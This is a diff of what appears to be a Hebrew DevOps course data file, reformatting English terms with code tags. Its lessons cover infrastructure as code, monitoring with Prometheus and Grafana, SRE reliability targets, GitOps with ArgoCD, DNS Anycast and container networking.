+  <tr><td><code>Terraform</code></td><td>יצירת תשתית (<code>provision</code>)</td><td><code>HCL</code></td></tr>
+  <tr><td><code>Ansible</code></td><td>הגדרת תוכן שרתים (<code>configure</code>)</td><td><code>YAML</code></td></tr>
+  <tr><td><code>GitHub Actions</code></td><td><code>pipeline</code> <code>CI/CD</code></td><td><code>YAML</code></td></tr>
 </table>
 <div class="code-preview"><pre><code># playbook.yml — התקנת nginx על שרתים
 ---
@@ -8153,9 +8153,9 @@ ansible-playbook -i inventory playbook.yml</code></pre></div>
         type: "explanation",
         title: "3 עמודות האבסרוובביליטי",
         content: `<div dir="rtl">
-<h2>Observability — לדעת מה קורה</h2>
-<p><strong>Observability</strong></p>
-<p>מערכת מודרנית חייבת להיות <strong>observable</strong>.</p>
+<h2><code>Observability</code> — לדעת מה קורה</h2>
+<p><strong><code>Observability</code></strong></p>
+<p>מערכת מודרנית חייבת להיות <strong><code>observable</code></strong>.</p>
 <p>לא מספיק שהיא עובדת — היא צריכה לחשוף את מצבה הפנימי.</p>
 <div class="diagram-container">
 <svg viewBox="0 0 360 120" class="content-diagram">
@@ -8180,9 +8180,9 @@ ansible-playbook -i inventory playbook.yml</code></pre></div>
 </div>
 <table class="content-table">
   <tr><th>עמוד</th><th>שאלה שעונה עליה</th><th>כלים</th></tr>
-  <tr><td><strong>Metrics</strong></td><td>"האם המערכת בריאה?"</td><td>Prometheus, Grafana, CloudWatch</td></tr>
-  <tr><td><strong>Logs</strong></td><td>"מה בדיוק קרה?"</td><td>ELK Stack, Loki, Splunk</td></tr>
-  <tr><td><strong>Traces</strong></td><td>"מה המסלול של הבקשה?"</td><td>Jaeger, Zipkin, X-Ray</td></tr>
+  <tr><td><strong><code>Metrics</code></strong></td><td>"האם המערכת בריאה?"</td><td><code>Prometheus</code>, <code>Grafana</code>, <code>CloudWatch</code></td></tr>
+  <tr><td><strong><code>Logs</code></strong></td><td>"מה בדיוק קרה?"</td><td><code>ELK Stack</code>, <code>Loki</code>, <code>Splunk</code></td></tr>
+  <tr><td><strong><code>Traces</code></strong></td><td>"מה המסלול של הבקשה?"</td><td><code>Jaeger</code>, <code>Zipkin</code>, <code>X-Ray</code></td></tr>
 </table>
 <p><strong>כלל ה-3 השאלות</strong></p>
 <ol>
@@ -8197,11 +8197,11 @@ ansible-playbook -i inventory playbook.yml</code></pre></div>
         title: "Prometheus + Grafana",
         content: `<div dir="rtl">
 <h2>המחסנית הסטנדרטית לניטור</h2>
-<p><strong>Prometheus</strong></p>
+<p><strong><code>Prometheus</code></strong></p>
 <p>אוסף מדדים מהשירותים באמצעות <code>scraping</code>.</p>
-<p><strong>Grafana</strong></p>
+<p><strong><code>Grafana</code></strong></p>
 <p>מציגה <code>dashboards</code> ויזואליים.</p>
-<p><strong>AlertManager</strong></p>
+<p><strong><code>AlertManager</code></strong></p>
 <p>שולח התראות לפי כללים.</p>
 <div class="code-preview"><pre><code># prometheus.yml — הגדרת scraping
 global:
@@ -8255,17 +8255,17 @@ async def metrics_middleware(request, call_next):
         title: "SLI, SLO, SLA — ניהול אמינות",
         content: `<div dir="rtl">
 <h2>שפת האמינות של Google SRE</h2>
-<p><strong>SRE</strong> — <code>Site Reliability Engineering</code></p>
-<p>Google המציאה את התחום הזה.</p>
+<p><strong><code>SRE</code></strong> — <code>Site Reliability Engineering</code></p>
+<p><code>Google</code> המציאה את התחום הזה.</p>
 <p>זוהי גישה מהנדסית לניהול שירותים בפרודקשן.</p>
 <table class="content-table">
   <tr><th>מושג</th><th>הגדרה</th><th>דוגמה</th></tr>
-  <tr><td><strong>SLI</strong> — Indicator</td><td>המדד שמודדים</td><td>% בקשות שהחזירו תגובה תוך 200ms</td></tr>
-  <tr><td><strong>SLO</strong> — Objective</td><td>היעד הפנימי</td><td>99.9% הבקשות מגיבות תוך 200ms</td></tr>
-  <tr><td><strong>SLA</strong> — Agreement</td><td>הסכם עם לקוחות</td><td>99.5% — אחרת קרדיט כספי</td></tr>
-  <tr><td><strong>Error Budget</strong></td><td>מה מותר להיכשל</td><td>0.1% = 43.8 דקות לחודש <code>downtime</code></td></tr>
+  <tr><td><strong><code>SLI</code></strong> — <code>Indicator</code></td><td>המדד שמודדים</td><td>% בקשות שהחזירו תגובה תוך 200ms</td></tr>
+  <tr><td><strong><code>SLO</code></strong> — <code>Objective</code></td><td>היעד הפנימי</td><td>99.9% הבקשות מגיבות תוך 200ms</td></tr>
+  <tr><td><strong><code>SLA</code></strong> — <code>Agreement</code></td><td>הסכם עם לקוחות</td><td>99.5% — אחרת קרדיט כספי</td></tr>
+  <tr><td><strong><code>Error Budget</code></strong></td><td>מה מותר להיכשל</td><td>0.1% = 43.8 דקות לחודש <code>downtime</code></td></tr>
 </table>
-<p><strong>Error Budget — הרעיון המפתח</strong></p>
+<p><strong><code>Error Budget</code> — הרעיון המפתח</strong></p>
 <ul>
 <li><code>SLO</code> של 99.9% = 0.1% <code>error budget</code> לחודש</li>
 <li>השתמשנו ב-50% מהתקציב? אפשר לדפלוי בזהירות</li>
@@ -8287,30 +8287,30 @@ error_budget_minutes = minutes_per_month * (100 - slo) / 100
         title: "ELK Stack ותרבות Postmortem",
         content: `<div dir="rtl">
 <h2>ELK — ניהול לוגים בקנה מידה</h2>
-<p><strong>ELK</strong> — <code>Elasticsearch</code> + <code>Logstash</code> + <code>Kibana</code></p>
+<p><strong><code>ELK</code></strong> — <code>Elasticsearch</code> + <code>Logstash</code> + <code>Kibana</code></p>
 <p>המחסנית אוספת, מאחסנת ומציגה מיליארדי שורות לוג במהירות.</p>
 <table class="content-table">
   <tr><th>רכיב</th><th>תפקיד</th></tr>
-  <tr><td><strong>Elasticsearch</strong></td><td>מאגר נתונים לחיפוש מהיר — מאחסן לוגים</td></tr>
-  <tr><td><strong>Logstash</strong></td><td>מעבד ומפרמט לוגים מכל מקור</td></tr>
-  <tr><td><strong>Kibana</strong></td><td>UI לחיפוש, dashboards, alerts</td></tr>
-  <tr><td><strong>Filebeat</strong></td><td>agent קל על השרתים — שולח לוגים ל-ELK</td></tr>
+  <tr><td><strong><code>Elasticsearch</code></strong></td><td>מאגר נתונים לחיפוש מהיר — מאחסן לוגים</td></tr>
+  <tr><td><strong><code>Logstash</code></strong></td><td>מעבד ומפרמט לוגים מכל מקור</td></tr>
+  <tr><td><strong><code>Kibana</code></strong></td><td>UI לחיפוש, dashboards, alerts</td></tr>
+  <tr><td><strong><code>Filebeat</code></strong></td><td><code>agent</code> קל על השרתים — שולח לוגים ל-<code>ELK</code></td></tr>
 </table>
-<h3>תרבות Postmortem — ממוגלה ל-Google</h3>
+<h3>תרבות <code>Postmortem</code> — ממוגלה ל-<code>Google</code></h3>
 <p>כשמשהו נשבר בפרודקשן — מה עושים?</p>
-<p>חברות טובות כותבות <strong>Postmortem</strong> — <code>blameless</code>:</p>
+<p>חברות טובות כותבות <strong><code>Postmortem</code></strong> — <code>blameless</code>:</p>
 <ol>
-  <li><strong>Timeline</strong> — מה קרה בדיוק, בכל דקה</li>
-  <li><strong>Root Cause</strong> — מה גרם לתקלה — לא מי!</li>
-  <li><strong>Impact</strong> — כמה משתמשים נפגעו, כמה זמן</li>
-  <li><strong>Action Items</strong> — מה נשנה כדי שזה לא יקרה שוב</li>
+  <li><strong><code>Timeline</code></strong> — מה קרה בדיוק, בכל דקה</li>
+  <li><strong><code>Root Cause</code></strong> — מה גרם לתקלה — לא מי!</li>
+  <li><strong><code>Impact</code></strong> — כמה משתמשים נפגעו, כמה זמן</li>
+  <li><strong><code>Action Items</code></strong> — מה נשנה כדי שזה לא יקרה שוב</li>
 </ol>
-<p><strong>Blameless</strong></p>
+<p><strong><code>Blameless</code></strong></p>
 <p>אנשים לא מפחדים לדווח על תקלות, כי המטרה היא ללמוד — לא להעניש.</p>
-<p>Google מפרסמת <code>postmortems</code> פנימיים בפומבי.</p>
+<p><code>Google</code> מפרסמת <code>postmortems</code> פנימיים בפומבי.</p>
 <p><strong>כישלון שלא לומדים ממנו הוא הכישלון האמיתי.</strong></p>
-<p>Etsy המציאה את הגישה ב-2012.</p>
-<p>היום זה סטנדרט ב-Netflix, Google, Amazon ו-Cloudflare.</p>
+<p><code>Etsy</code> המציאה את הגישה ב-2012.</p>
+<p>היום זה סטנדרט ב-<code>Netflix</code>, <code>Google</code>, <code>Amazon</code> ו-<code>Cloudflare</code>.</p>
 </div>`
       }
     ]
@@ -8338,10 +8338,10 @@ error_budget_minutes = minutes_per_month * (100 - slo) / 100
 </ul>
 <table class="content-table">
   <tr><th>גישה ידנית</th><th>IaC</th></tr>
-  <tr><td>Click בconsole — לא ניתן לשחזר</td><td>קוד ב-Git — reproducible תמיד</td></tr>
-  <tr><td>Configuration drift — שרתים שונים</td><td>Idempotent — אותה תוצאה בכל הרצה</td></tr>
-  <tr><td>Snowflake servers — כל שרת ייחודי</td><td>Cattle not pets — שרתים זהים</td></tr>
-  <tr><td>Documentation מיושנת</td><td>הקוד הוא התיעוד</td></tr>
+  <tr><td><code>Click</code> ב-<code>console</code> — לא ניתן לשחזר</td><td>קוד ב-<code>Git</code> — <code>reproducible</code> תמיד</td></tr>
+  <tr><td><code>Configuration drift</code> — שרתים שונים</td><td><code>Idempotent</code> — אותה תוצאה בכל הרצה</td></tr>
+  <tr><td><code>Snowflake servers</code> — כל שרת ייחודי</td><td><code>Cattle not pets</code> — שרתים זהים</td></tr>
+  <tr><td><code>Documentation</code> מיושנת</td><td>הקוד הוא התיעוד</td></tr>
 </table>
 <p><strong>כלים מובילים</strong></p>
 <ul>
@@ -8381,9 +8381,9 @@ output "public_ip" {
 }</code></pre>
 <table class="content-table">
   <tr><th>כלי IaC</th><th>Provider support</th><th>שפה</th><th>State</th></tr>
-  <tr><td><strong>Terraform</strong></td><td>700+ providers</td><td>HCL</td><td>tfstate file</td></tr>
-  <tr><td><strong>CloudFormation</strong></td><td>AWS בלבד</td><td>JSON/YAML</td><td>AWS managed</td></tr>
-  <tr><td><strong>Pulumi</strong></td><td>100+ providers</td><td>Python/TS/Go</td><td>Pulumi Cloud</td></tr>
+  <tr><td><strong><code>Terraform</code></strong></td><td>700+ <code>providers</code></td><td><code>HCL</code></td><td><code>tfstate</code> file</td></tr>
+  <tr><td><strong><code>CloudFormation</code></strong></td><td><code>AWS</code> בלבד</td><td><code>JSON</code>/<code>YAML</code></td><td><code>AWS</code> managed</td></tr>
+  <tr><td><strong><code>Pulumi</code></strong></td><td>100+ <code>providers</code></td><td><code>Python</code>/<code>TS</code>/<code>Go</code></td><td><code>Pulumi Cloud</code></td></tr>
 </table>
 <p><strong>שלושה מרכיבי בסיס</strong></p>
 <ul>
@@ -8429,11 +8429,11 @@ terraform {
         content: `<div dir="rtl">
 <h2>כשהשרת נפל — ואיש לא בכה</h2>
 <p>ב-2012, Netflix הציגה מטפורה שהפכה לאחד הרעיונות המשפיעים ביותר ב-<code>DevOps</code>.</p>
-<p><strong>Cattle vs Pets</strong> — בקר לעומת חיות מחמד.</p>
+<p><strong><code>Cattle vs Pets</code></strong> — בקר לעומת חיות מחמד.</p>
 <h3>חיות מחמד — Pets</h3>
 <ul>
 <li>לשרתים יש שמות — "Big Iron", "dev-01"</li>
-<li>כשהם חולים, אנשי Ops עושים לילות לבנים כדי לרפא אותם</li>
+<li>כשהם חולים, אנשי <code>Ops</code> עושים לילות לבנים כדי לרפא אותם</li>
 <li>אם הם מתים — זו טרגדיה</li>
 <li>כל שרת ייחודי, מוגדר ידנית, ולא ניתן להחליפו בקלות</li>
 </ul>
@@ -8446,13 +8446,13 @@ terraform {
 <li><code>Auto Scaling Group</code> — אם אחד מת, AWS מייצר אחר אוטומטית</li>
 </ul>
 
-<h3>Chaos Monkey</h3>
-<p>Netflix פיתחה כלי שמכבה שרתי פרודקשן אקראית במהלך שעות העבודה — בכוונה.</p>
+<h3><code>Chaos Monkey</code></h3>
+<p><code>Netflix</code> פיתחה כלי שמכבה שרתי פרודקשן אקראית במהלך שעות העבודה — בכוונה.</p>
 <p>המטרה: לוודא שהמערכת עמידה.</p>
-<p>אם זה מכאיב — תתקנו. אם לא — אתם Cattle-ready.</p>
+<p>אם זה מכאיב — תתקנו. אם לא — אתם <code>Cattle-ready</code>.</p>
 
-<h3>תשתית Immutable</h3>
-<p><strong>עיקרון תשתית Immutable</strong></p>
+<h3>תשתית <code>Immutable</code></h3>
+<p><strong>עיקרון תשתית <code>Immutable</code></strong></p>
 <p>לא משנים — רק מחליפים.</p>
 <p>זה הלב של <code>IaC</code> מודרני.</p>
 <p>טכניקות שמסתמכות על הרעיון הזה:</p>
@@ -8476,14 +8476,14 @@ terraform {
 <h2>Metrics, Logs, Traces — המשולש הקדוש</h2>
 <p><strong>Observability</strong></p>
 <p>כשמשהו משתבש בפרודקשן, אתם צריכים שלושה סוגי מידע שונים.</p>
-<p>Google קוראת לגישה הזו <strong>Observability</strong>.</p>
+<p><code>Google</code> קוראת לגישה הזו <strong><code>Observability</code></strong>.</p>
 <table class="content-table">
   <tr><th>סוג</th><th>מה זה</th><th>שאלות שעונה</th><th>כלים</th></tr>
-  <tr><td><strong>Metrics</strong></td><td>מספרים לאורך זמן</td><td>"מה המצב עכשיו?"</td><td><code>Prometheus</code>, <code>Datadog</code></td></tr>
-  <tr><td><strong>Logs</strong></td><td>אירועים טקסטואליים</td><td>"מה בדיוק קרה?"</td><td><code>ELK</code>, <code>Loki</code></td></tr>
-  <tr><td><strong>Traces</strong></td><td>מסלול <code>request</code> בין <code>services</code></td><td>"איפה ה-<code>bottleneck</code>?"</td><td><code>Jaeger</code>, <code>Zipkin</code></td></tr>
+  <tr><td><strong><code>Metrics</code></strong></td><td>מספרים לאורך זמן</td><td>"מה המצב עכשיו?"</td><td><code>Prometheus</code>, <code>Datadog</code></td></tr>
+  <tr><td><strong><code>Logs</code></strong></td><td>אירועים טקסטואליים</td><td>"מה בדיוק קרה?"</td><td><code>ELK</code>, <code>Loki</code></td></tr>
+  <tr><td><strong><code>Traces</code></strong></td><td>מסלול <code>request</code> בין <code>services</code></td><td>"איפה ה-<code>bottleneck</code>?"</td><td><code>Jaeger</code>, <code>Zipkin</code></td></tr>
 </table>
-<p><strong>Prometheus</strong></p>
+<p><strong><code>Prometheus</code></strong></p>
 <p>נבנתה ב-<code>SoundCloud</code> ב-2012 והפכה לסטנדרט ב-<code>Kubernetes</code>.</p>
 <p>פועלת במודל <code>pull</code> — סורקת כל <code>service</code> ואוספת ממנו <code>metrics</code>.</p>
 <p>שומרת ב-<code>time-series database</code>.</p>
@@ -8522,16 +8522,16 @@ ALERT HighErrorRate
   ANNOTATIONS { summary = "Error rate above 1%" }</code></pre>
 <table class="content-table">
   <tr><th>Method</th><th>Metrics</th><th>שאלה</th></tr>
-  <tr><td><strong>RED</strong> — שירותים</td><td><code>Rate</code>, <code>Errors</code>, <code>Duration</code></td><td>כמה? כשל? כמה זמן?</td></tr>
-  <tr><td><strong>USE</strong> — משאבים</td><td><code>Utilization</code>, <code>Saturation</code>, <code>Errors</code></td><td>שימוש? קיבולת? שגיאות?</td></tr>
+  <tr><td><strong><code>RED</code></strong> — שירותים</td><td><code>Rate</code>, <code>Errors</code>, <code>Duration</code></td><td>כמה? כשל? כמה זמן?</td></tr>
+  <tr><td><strong><code>USE</code></strong> — משאבים</td><td><code>Utilization</code>, <code>Saturation</code>, <code>Errors</code></td><td>שימוש? קיבולת? שגיאות?</td></tr>
 </table>
-<p><strong>RED</strong> — שימושי ל-<code>microservices</code></p>
+<p><strong><code>RED</code></strong> — שימושי ל-<code>microservices</code></p>
 <ul>
 <li>כמה בקשות לשנייה?</li>
 <li>כמה נכשלות?</li>
 <li>מה ה-<code>latency</code>?</li>
 </ul>
-<p><strong>USE</strong> — שימושי לתשתית</p>
+<p><strong><code>USE</code></strong> — שימושי לתשתית</p>
 <ul>
 <li>מה צריכת ה-<code>CPU</code>?</li>
 <li>מה עומק התור?</li>
@@ -8544,7 +8544,7 @@ ALERT HighErrorRate
         title: "Grafana Dashboards — הסיפור החזותי",
         content: `<div dir="rtl">
 <h2>מנתונים ל-Insights ויזואליים</h2>
-<p><strong>Grafana</strong></p>
+<p><strong><code>Grafana</code></strong></p>
 <p>שכבת הוויזואליזציה שמתחברת ל-<code>Prometheus</code> ולעשרות מקורות נתונים נוספים.</p>
 <p><code>Dashboard</code> טוב מספר סיפור.</p>
 <p><strong>דוגמה</strong></p>
@@ -8568,11 +8568,11 @@ ALERT HighErrorRate
   <defs><marker id="arr-prom" markerWidth="6" markerHeight="6" refX="3" refY="3" orient="auto"><path d="M0,0 L6,3 L0,6 Z" fill="#94a3b8"/></marker></defs>
 </svg>
 </div>
-<p><strong>Best practices ל-dashboard</strong></p>
+<p><strong><code>Best practices</code> ל-<code>dashboard</code></strong></p>
 <ul>
-<li><strong>Golden Signals בראש</strong> — <code>latency</code> / <code>traffic</code> / <code>errors</code> / <code>saturation</code></li>
-<li><strong>Drill-down</strong> — מהתמונה הכללית לפרטים</li>
-<li><strong>Annotations</strong> — סימון <code>deployments</code> על הגרף. כדי לראות קשר בין <code>deploy</code> לשינויי מדדים</li>
+<li><strong><code>Golden Signals</code> בראש</strong> — <code>latency</code> / <code>traffic</code> / <code>errors</code> / <code>saturation</code></li>
+<li><strong><code>Drill-down</code></strong> — מהתמונה הכללית לפרטים</li>
+<li><strong><code>Annotations</code></strong> — סימון <code>deployments</code> על הגרף. כדי לראות קשר בין <code>deploy</code> לשינויי מדדים</li>
 </ul>
 </div>`
       },
@@ -8581,7 +8581,7 @@ ALERT HighErrorRate
         title: "הסיפור: Memory Leak שנתפס לפני שהשפיע",
         content: `<div dir="rtl">
 <h2>כשהגרף הציל את הפרודקשן</h2>
-<p>סטארטאפ SaaS קטן. יום רגיל.</p>
+<p>סטארטאפ <code>SaaS</code> קטן. יום רגיל.</p>
 <p><code>Grafana</code> שולחת <code>Slack alert</code>:</p>
 <p>"Memory usage ב-<code>service X</code> עולה בקצב קבוע של 2MB לשעה".</p>
 <p>לא התראה קריטית — רק <code>warning</code>.</p>
@@ -8614,18 +8614,18 @@ ALERT HighErrorRate
         title: "GitOps — Git כמקור האמת היחיד",
         content: `<div dir="rtl">
 <h2>GitOps — מה שב-Git הוא מה שב-Production</h2>
-<p><strong>GitOps</strong></p>
+<p><strong><code>GitOps</code></strong></p>
 <p>פרקטיקה שבה <strong>כל מצב הפרודקשן מוגדר ב-<code>Git</code></strong>.</p>
 <p>לא רק קוד האפליקציה — אלא גם כל ה-<code>Kubernetes manifests</code>, ה-<code>Helm values</code> וה-<code>infrastructure config</code>.</p>
 <p><strong>עקרונות GitOps</strong></p>
 <ul>
-  <li><strong>Declarative</strong> — מתאר מה רוצים, לא איך לעשות</li>
-  <li><strong>Versioned</strong> — כל שינוי הוא <code>commit</code> — ניתן ל-<code>rollback</code> מיידי</li>
-  <li><strong>Automated</strong> — <code>controller</code> מסנכרן <code>Git</code> ל-<code>cluster</code> אוטומטית</li>
-  <li><strong>Continuous reconciliation</strong> — אם מישהו שינה משהו ב-<code>cluster</code> ידנית — <code>Controller</code> מחזיר למצב ב-<code>Git</code></li>
+  <li><strong><code>Declarative</code></strong> — מתאר מה רוצים, לא איך לעשות</li>
+  <li><strong><code>Versioned</code></strong> — כל שינוי הוא <code>commit</code> — ניתן ל-<code>rollback</code> מיידי</li>
+  <li><strong><code>Automated</code></strong> — <code>controller</code> מסנכרן <code>Git</code> ל-<code>cluster</code> אוטומטית</li>
+  <li><strong><code>Continuous reconciliation</code></strong> — אם מישהו שינה משהו ב-<code>cluster</code> ידנית — <code>Controller</code> מחזיר למצב ב-<code>Git</code></li>
 </ul>
 <table class="content-table">
-  <tr><th>מודל</th><th>Push Deployment</th><th>Pull (GitOps)</th></tr>
+  <tr><th>מודל</th><th><code>Push Deployment</code></th><th><code>Pull</code> (<code>GitOps</code>)</th></tr>
   <tr><td>מי פועל</td><td><code>CI pipeline</code></td><td><code>Controller</code> ב-<code>cluster</code></td></tr>
   <tr><td>הרשאות</td><td><code>CI</code> צריך <code>kubectl access</code></td><td>אין גישה חיצונית ל-<code>cluster</code></td></tr>
   <tr><td><code>Drift</code></td><td>לא מזוהה</td><td>מזוהה ותוקן אוטומטית</td></tr>
@@ -8679,7 +8679,7 @@ spec:
     automated:
       prune: true       # מוחק resources שנמחקו מGit
       selfHeal: true    # מתקן drift אוטומטית</code></pre>
-<p><strong>ArgoCD</strong></p>
+<p><strong><code>ArgoCD</code></strong></p>
 <p>מסנכרן כל 3 דקות:</p>
 <ul>
 <li>שינוי ב-<code>Git</code> — <code>deploy</code> אוטומטי</li>
@@ -8693,7 +8693,7 @@ spec:
         title: "Drift Detection — הביטחון של GitOps",
         content: `<div dir="rtl">
 <h2>כשמישהו שינה משהו — ArgoCD יודע</h2>
-<p><strong>Drift Detection</strong></p>
+<p><strong><code>Drift Detection</code></strong></p>
 <p>הכוח הגדול ביותר של <code>GitOps</code>.</p>
 <p>כל שינוי ב-<code>cluster</code> שלא מגיע מ-<code>Git</code> — <code>ArgoCD</code> מזהה ומדווח.</p>
 <p>אם מוגדר <code>selfHeal</code>, הוא מחזיר את המצב אוטומטית.</p>
@@ -8711,10 +8711,10 @@ argocd app rollback my-app 3</code></pre>
 <p>לעולם לא מאחסנים סיסמאות ב-<code>Git</code>.</p>
 <p><strong>הפתרונות</strong></p>
 <ul>
-<li><strong>Sealed Secrets</strong> — מוצפן ב-<code>public key</code>. רק ה-<code>cluster</code> יכול לפענח</li>
-<li><strong>External Secrets Operator</strong> — מושך סודות מ-<code>Vault</code> או <code>AWS Secrets Manager</code></li>
+<li><strong><code>Sealed Secrets</code></strong> — מוצפן ב-<code>public key</code>. רק ה-<code>cluster</code> יכול לפענח</li>
+<li><strong><code>External Secrets Operator</code></strong> — מושך סודות מ-<code>Vault</code> או <code>AWS Secrets Manager</code></li>
 </ul>
-<p><strong>ApplicationSet</strong></p>
+<p><strong><code>ApplicationSet</code></strong></p>
 <p>תכונה מתקדמת שיוצרת <code>Applications</code> מרובות אוטומטית.</p>
 <p>ניתן לייצר אחת לכל <code>namespace</code>, לכל <code>cluster</code>, או לכל <code>feature branch</code>.</p>
 <p>מאפשרת ניהול <code>GitOps</code> במרובה אשכולות.</p>
@@ -9040,7 +9040,7 @@ dig +dnssec cloudflare.com
   <tr><td><code>DoH</code></td><td>443 / <code>HTTPS</code></td><td><code>TLS</code></td><td>מוצפן + נראה כ-<code>HTTPS</code> רגיל</td></tr>
   <tr><td><code>DoQ</code></td><td>853 / <code>QUIC</code></td><td><code>QUIC</code></td><td>מוצפן + מהיר יותר</td></tr>
 </table>
-<h3>Anycast — למה 8.8.8.8 מהיר מכל מקום</h3>
+<h3><code>Anycast</code> — למה <code>8.8.8.8</code> מהיר מכל מקום</h3>
 <p><code>Google</code> מפרסמת את <code>8.8.8.8</code> מעשרות מיקומים עם <code>BGP Anycast</code>.</p>
 <p><code>BGP</code> תמיד מנתב ל-<code>POP</code> הקרוב ביותר.</p>
 <p>מישראל אתה מדבר עם <code>datacenter</code> בישראל או אירופה — לא בארה"ב.</p>
@@ -9458,7 +9458,7 @@ openssl s_client -connect example.com:443 2>/dev/null | openssl x509 -noout -tex
 <p>כשאתם שולחים שאילתה ל-<code>1.1.1.1</code> — <code>Cloudflare DNS</code> — הבקשה מגיעה ל-<code>POP</code> הקרוב אליכם.</p>
 <p>בתל אביב, לונדון, או ניו יורק.</p>
 <p>כולם עם <strong>אותה כתובת IP</strong>.</p>
-<p>זה <strong>Anycast</strong>.</p>
+<p>זה <strong><code>Anycast</code></strong>.</p>
 <p><strong>כיצד זה עובד?</strong></p>
 <p><code>Cloudflare</code> מפרסמת את ה-<code>prefix</code> <code>1.1.1.1/32</code> ב-<code>BGP</code> מ-300 מיקומים שונים.</p>
 <p><code>BGP routers</code> בוחרים תמיד את ה-<code>shortest AS path</code> — כלומר ה-<code>POP</code> הקרוב ביותר.</p>
@@ -9591,7 +9591,7 @@ ip link set veth0 master docker0
 # הפעלה
 ip netns exec container1 ip link set veth1 up
 ip netns exec container1 ip addr add 172.17.0.2/16 dev veth1</code></pre>
-<p><strong>veth pair</strong></p>
+<p><strong><code>veth pair</code></strong></p>
 <p>כל <code>container</code> מקבל <code>veth pair</code> — כבל וירטואלי שמקשר בין ה-<code>namespace</code> ל-<code>bridge</code> של ה-<code>host</code>.</p>
 <p>ה-<code>bridge docker0</code> הוא ה-<code>switch</code> הווירטואלי שמחבר את כל ה-<code>containers</code> ביחד.</p>
 </div>`
@@ -9600,7 +9600,7 @@ ip netns exec container1 ip addr add 172.17.0.2/16 dev veth1</code></pre>
         type: "diagram",
         title: "Docker Networking Architecture",
         content: `<div dir="rtl">
-<h2>veth pairs, Bridge ו-NAT</h2>
+<h2><code>veth pairs</code>, <code>Bridge</code> ו-<code>NAT</code></h2>
 <div class="diagram-container">
 <svg viewBox="0 0 360 130" class="content-diagram">
   <rect x="5" y="5" width="350" height="120" rx="6" fill="#0f172a" stroke="#334155" stroke-width="1"/>
@@ -9665,10 +9665,10 @@ cilium connectivity test
 # tcpdump על veth של pod
 VETH=$(ip link | grep -o "vethABCDEF")
 tcpdump -i $VETH -n</code></pre>
-<p><strong>Flannel VXLAN</strong></p>
+<p><strong><code>Flannel VXLAN</code></strong></p>
 <p><code>packets</code> בין <code>nodes</code> עוטפים ב-<code>UDP</code> פורט 8472.</p>
 <p>ה-<code>CNI</code> יוצר מנהרה.</p>
-<p><strong>Calico BGP</strong></p>
+<p><strong><code>Calico BGP</code></strong></p>
 <p>כל <code>node</code> הוא <code>BGP router</code> שמפרסם את ה-<code>pod CIDR</code> שלו.</p>
 <p>ה-<code>packets</code> עוברים ב-<code>L3</code> ישירות, ללא עטיפה — מהיר יותר.</p>
 </div>`
@@ -9713,7 +9713,7 @@ spec:
         http:
         - method: GET
           path: "/api/.*"</code></pre>
-<p><strong>Hubble</strong> — נראות בזמן אמת</p>
+<p><strong><code>Hubble</code></strong> — נראות בזמן אמת</p>
 <p>מציג את כל התעבורה בין <code>pods</code>:</p>
 <ul>
 <li>איזה <code>pod</code> מדבר עם איזה</li>
